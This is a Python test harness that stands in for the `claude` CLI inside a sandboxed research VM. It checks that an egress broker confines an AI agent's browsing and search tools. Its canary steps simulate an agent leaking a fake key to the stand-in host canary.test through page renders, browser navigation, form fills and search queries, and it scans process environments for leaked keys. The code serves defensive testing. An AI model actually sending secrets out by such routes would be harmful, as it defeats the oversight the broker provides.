#!/usr/bin/env python3
"""A stand-in for the `claude` CLI inside the research jail, for nixos-config's
`vm-egress-switchover` lane (docs/egress-broker.md §12.5).

The lane puts this file on the research VM's PATH as `claude`, so the real
run-agent.sh, the real bwrap jail and the real shims from agent/.mcp.json all
run unchanged; only the LLM is replaced. It reads a plan embedded in the
prompt (`LANEPLAN:<base64url JSON>`, so no plan URL is visible to the broker's
prompt-URL extractor), drives the shims over MCP stdio exactly as the CLI
would, and writes a report to the scratch path:

    MODE broker|legacy
    RESULT <step> ok|refused|error [<closed detail>]
    DONE

Plan keys: `v` (variant: exa, ikea, ebay, browse, intercept, long, none),
`canary` (bool: run the canary steps, broker mode only), `envcheck` (bool),
`long_s` (seconds a `long` browse session stays open), `hold_s` (seconds to
sleep before the variant), `nonce` (hex, makes the canary URL unique).

Closed vocabulary only: the report names steps and outcomes; it never copies
a tool's text, so nothing a page says reaches the host through it. Stdlib only.
"""
from __future__ import annotations

import base64
import json
import os
import re
import subprocess
import sys
import time
import urllib.request

PLAN_RE = re.compile(r"LANEPLAN:([A-Za-z0-9_-]+)")
SCRATCH_RE = re.compile(r"/scratch/[0-9a-f]{32}\.md")
URL_RE = re.compile(r"https://[^\s)\]\"'<>]+")
SID_RE = re.compile(r"session_id:\s*([a-f0-9]{16})")
# What the broker says when its gate refuses something (§3, §4). Matched on
# the shim's error text; only the verdict leaves this process.
REFUSALS = (
    "refused by the provenance gate",
    "typed text",
    "typed word",
    "search query must not contain a url",
)
KEY_MARK = "LANEKEY-"


class Shim:
    """One MCP stdio server from agent/.mcp.json, spoken to like the CLI does."""

    def __init__(self, name: str, spec: dict):
        self.name = name
        # The CLI hands an MCP server its own environment (plus the entry's
        # `env`, none in .mcp.json): inherit, exactly like that.
        env = dict(os.environ)
        env.update(spec.get("env") or {})
        self.p = subprocess.Popen(
            [spec["command"], *spec.get("args", [])],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            env=env, text=True, bufsize=1,
        )
        self.n = 0
        self._rpc("initialize", {"protocolVersion": "2024-11-05", "capabilities": {},
                                 "clientInfo": {"name": "lane-fake-agent", "version": "1"}})
        self._send({"jsonrpc": "2.0", "method": "notifications/initialized"})

    def _send(self, msg: dict) -> None:
        self.p.stdin.write(json.dumps(msg) + "\n")
        self.p.stdin.flush()

    def _rpc(self, method: str, params: dict) -> dict:
        self.n += 1
        self._send({"jsonrpc": "2.0", "id": self.n, "method": method, "params": params})
        while True:
            line = self.p.stdout.readline()
            if not line:
                raise RuntimeError("shim-exited")
            try:
                msg = json.loads(line)
            except json.JSONDecodeError:
                continue
            if msg.get("id") == self.n:
                return msg

    def call(self, tool: str, args: dict) -> tuple[bool, str]:
        """(is_error, text) of one tools/call."""
        msg = self._rpc("tools/call", {"name": tool, "arguments": args})
        if "error" in msg:
            return True, str(msg["error"].get("message", ""))
        res = msg.get("result") or {}
        text = "\n".join(c.get("text", "") for c in res.get("content") or []
                         if isinstance(c, dict) and c.get("type") == "text")
        return bool(res.get("isError")), text

    def close(self) -> None:
        try:
            self.p.stdin.close()
            self.p.wait(timeout=10)
        except Exception:
            self.p.kill()


class Agent:
    def __init__(self):
        with open(".mcp.json", encoding="utf-8") as f:
            self.specs = json.load(f)["mcpServers"]
        self.shims: dict[str, Shim] = {}
        self.lines: list[str] = []

    def shim(self, name: str) -> Shim:
        if name not in self.shims:
            self.shims[name] = Shim(name, self.specs[name])
        return self.shims[name]

    def result(self, step: str, verdict: str, detail: str = "") -> None:
        self.lines.append(f"RESULT {step} {verdict}" + (f" {detail}" if detail else ""))

    def tool(self, shim: str, tool: str, args: dict) -> tuple[bool, str]:
        try:
            return self.shim(shim).call(tool, args)
        except Exception as e:  # transport: a closed class name only
            return True, f"transport {type(e).__name__}"

    def step(self, name: str, shim: str, tool: str, args: dict) -> str | None:
        """Run one call that must succeed; record ok/error; return its text."""
        err, text = self.tool(shim, tool, args)
        if err:
            self.result(name, "error", _klass(text))
            # Diagnostics for the lane log only (stderr reaches the dialing
            # host's process, never the report): the start of the error.
            print(f"fake-agent: {name} error: {text[:300]!r}", file=sys.stderr)
            return None
        self.result(name, "ok")
        return text

    def canary(self, name: str, shim: str, tool: str, args: dict) -> str:
        """Run one call the broker must refuse; record refused/ok/error."""
        err, text = self.tool(shim, tool, args)
        low = text.lower()
        if err and any(r in low for r in REFUSALS):
            verdict = "refused"
        elif err:
            verdict = "error"
        else:
            verdict = "ok"  # the gate let it through: the lane fails on this
        self.result(name, verdict, "" if verdict != "error" else _klass(text))
        return text

    def close(self) -> None:
        for s in self.shims.values():
            s.close()


def _klass(text: str) -> str:
    """A closed label for an error, never its text."""
    low = text.lower()
    for label, needles in (
        ("refused", REFUSALS),
        ("timeout", ("timed out", "timeout")),
        ("unreachable", ("connection refused", "unreachable", "no route", "name or service")),
        ("transport", ("transport",)),
        ("auth", ("401", "403", "unauthor")),
        # Regression tripwire, not an accepted outcome: the scraper refusing
        # a session call that carries no run id is the switchover outage
        # fixed in 975c900. Labelled so a relapse reads as itself in the
        # lane log instead of landing in "other".
        ("bad-run-id", ("bad run_id",)),
    ):
        if any(n in low for n in needles):
            return label
    return "other"


def _first(pattern: str, text: str | None) -> str | None:
    if not text:
        return None
    for u in URL_RE.findall(text):
        if re.search(pattern, u):
            return u.rstrip(".,;")
    return None


def variant(a: Agent, v: str, plan: dict) -> None:
    if v == "exa":
        out = a.step("exa_search", "exa", "web_search_exa", {"query": "kettle reviews", "numResults": 2})
        url = _first(r"^https://shop\.test/article/\d+$", out)
        if not url:
            return a.result("render_result", "error", "no-url")
        page = a.step("render_result", "render", "render_page", {"url": url})
        link = _first(r"^https://shop\.test/more/\d+$", page)
        if not link:
            return a.result("render_outlink", "error", "no-url")
        a.step("render_outlink", "render", "render_page", {"url": link})
    elif v == "ikea":
        page = a.step("render_template", "render", "render_page",
                      {"url": "https://www.ikea.com/se/sv/search/?q=kettle"})
        link = _first(r"^https://www\.ikea\.com/se/sv/p/", page)
        if not link:
            return a.result("render_product", "error", "no-url")
        a.step("render_product", "render", "render_page", {"url": link})
    elif v == "ebay":
        out = a.step("ebay_search", "shopping", "ebay_search", {"query": "kettle"})
        url = _first(r"^https://www\.ebay\.[a-z.]+/itm/\d+", out)
        if not url:
            return a.result("render_listing", "error", "no-url")
        a.step("render_listing", "render", "render_page", {"url": url})
    elif v in ("browse", "long", "reopen"):
        if v == "reopen":
            # T2d (§12.4): prove an OLD shim can still open a session against a
            # scraper that restarted undrained onto newly pulled code — the one
            # window `282efee`'s unbound sessions exist for.
            #
            # The shim must already be RUNNING before the pull. The real CLI
            # starts every MCP server at session start, but this harness starts
            # a shim on its first call to it, so a shim that first runs after
            # the pull would read the new code off the live /workspace share
            # and send a run_id — hiding the very case this variant exists to
            # catch. So: force the shim to start now with one open/close.
            out = a.step("browse_open_first", "render", "browse_open",
                         {"url": "https://shop.test/store"})
            m0 = SID_RE.search(out or "")
            if not m0:
                return a.result("browse_close_first", "error", "no-session")
            # Closed BEFORE the restart on purpose. A session surviving a
            # scraper restart is a different and unfixable case (sessions are
            # VM memory), so nothing below may depend on one.
            a.step("browse_close_first", "render", "browse_close",
                   {"session_id": m0.group(1)})
            time.sleep(float(plan.get("long_s", 60)))
        out = a.step("browse_open", "render", "browse_open", {"url": "https://shop.test/store"})
        m = SID_RE.search(out or "")
        if not m:
            return a.result("browse_act", "error", "no-session")
        sid = m.group(1)
        if v == "long":
            # One session held open across a broker reload (T2b).
            end = time.monotonic() + float(plan.get("long_s", 60))
            while time.monotonic() < end:
                a.step("browse_wait", "render", "browse_act",
                       {"session_id": sid, "actions": [{"type": "wait_ms", "ms": 10000}]})
        a.step("browse_act", "render", "browse_act", {"session_id": sid, "actions": [
            {"type": "click", "target": {"selector": "#q"}},
            {"type": "fill", "target": {"selector": "#q"}, "text": "kettle"},
            {"type": "press", "target": {"selector": "#q"}, "key": "Enter"},
            {"type": "wait_for_selector", "selector": "h1"},
        ]})
        a.step("browse_save_screenshot", "render", "browse_save_screenshot",
               {"session_id": sid, "name": "lane-shot"})
        a.step("browse_close", "render", "browse_close", {"session_id": sid})
    elif v == "intercept":
        a.step("intercept", "render", "intercept_page", {
            "url": "https://shop.test/spa",
            "actions": [
                {"type": "fill", "selector": "#q", "text": "kettle"},
                {"type": "click", "selector": "#go"},
                {"type": "wait_for_response", "url_pattern": "/api/search"},
            ],
            "capture_patterns": ["/api/search"],
        })


def canaries(a: Agent, nonce: str) -> None:
    """Every one of these must be refused by the broker (§12.5)."""
    leak = f"https://canary.test/c?k=FAKEKEY{nonce}"
    a.canary("canary_render", "render", "render_page", {"url": leak})
    out = a.step("canary_browse_open", "render", "browse_open", {"url": "https://shop.test/store"})
    m = SID_RE.search(out or "")
    if m:
        sid = m.group(1)
        a.canary("canary_goto", "render", "browse_act",
                 {"session_id": sid, "actions": [{"type": "goto", "url": leak}]})
        a.canary("canary_opaque_fill", "render", "browse_act", {"session_id": sid, "actions": [
            {"type": "fill", "target": {"selector": "#q"}, "text": f"k9Qz7Xw2Lm4Pv8Rt{nonce}"}]})
        a.tool("render", "browse_close", {"session_id": sid})
    else:
        a.result("canary_goto", "error", "no-session")
        a.result("canary_opaque_fill", "error", "no-session")
    a.canary("canary_template", "render", "render_page",
             {"url": "https://www.ikea.com/se/sv/search/?q=https://canary.test/x"})
    a.canary("canary_exa_query", "exa", "web_search_exa", {"query": "kettle canary.test/s"})


def envcheck(a: Agent) -> None:
    """The jail's view (§12.5 T5): no test key value in env or any /proc/*/environ.

    A process whose environ cannot be READ is reported, never skipped. This
    is a key-leak canary, so "I could not look" must not arrive as "clean" —
    an unreadable process is exactly where a leaked key would survive the
    check. Same convention as the G3 protocheck, which fails closed on a
    mode-0000 marker rather than passing over the process. A process that
    merely exited between listdir and open is a different thing and is
    skipped: there is nothing left to inspect, and in a jail with its own
    PID namespace short-lived shim children come and go constantly.
    """
    dirty = any(KEY_MARK in v for v in os.environ.values())
    unreadable = 0
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            with open(f"/proc/{pid}/environ", "rb") as f:
                if KEY_MARK.encode() in f.read():
                    dirty = True
        except (FileNotFoundError, ProcessLookupError):
            continue  # gone, not hidden
        except OSError:
            unreadable += 1
    a.result("envcheck", "dirty" if dirty else "clean")
    # A count, not a message: an integer crosses the boundary, no path or
    # process name. The lane asserts this is 0, so a check that silently
    # inspected nothing cannot read as a pass.
    a.result("envcheck_unreadable", str(unreadable))
    # TLS from inside the jail with the environment the jail actually has
    # (broker mode: --clearenv, so no SSL_CERT_FILE): §8.1's open question,
    # for the Python stack the shims use.
    try:
        with urllib.request.urlopen("https://api.anthropic.com/", timeout=20) as r:
            r.read(256)
        a.result("tlsprobe", "ok")
    except Exception as e:
        a.result("tlsprobe", "error", type(e).__name__)


def main(argv: list[str]) -> int:
    prompt = ""
    for i, arg in enumerate(argv):
        if arg == "-p" and i + 1 < len(argv):
            prompt = argv[i + 1]
    m = PLAN_RE.search(prompt)
    plan = json.loads(base64.urlsafe_b64decode(m.group(1) + "=" * (-len(m.group(1)) % 4))) if m else {}
    scratch = os.environ.get("RESEARCH_SCRATCH_PATH")
    if not scratch:
        sm = SCRATCH_RE.search(prompt)
        scratch = sm.group(0) if sm else ""
    mode = "broker" if os.environ.get("RESEARCH_BROKER_TOKEN") else "legacy"
    a = Agent()
    a.lines.append(f"MODE {mode}")
    try:
        if plan.get("hold_s"):
            time.sleep(float(plan["hold_s"]))
        variant(a, plan.get("v", "none"), plan)
        if mode == "broker" and plan.get("canary"):
            canaries(a, str(plan.get("nonce", "0")))
        if plan.get("envcheck"):
            envcheck(a)
    finally:
        a.close()
    a.lines.append("DONE")
    body = "# lane report\n\n" + "\n".join(a.lines) + "\n"
    if scratch:
        with open(scratch, "w", encoding="utf-8") as f:
            f.write(body)
    print("DONE")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
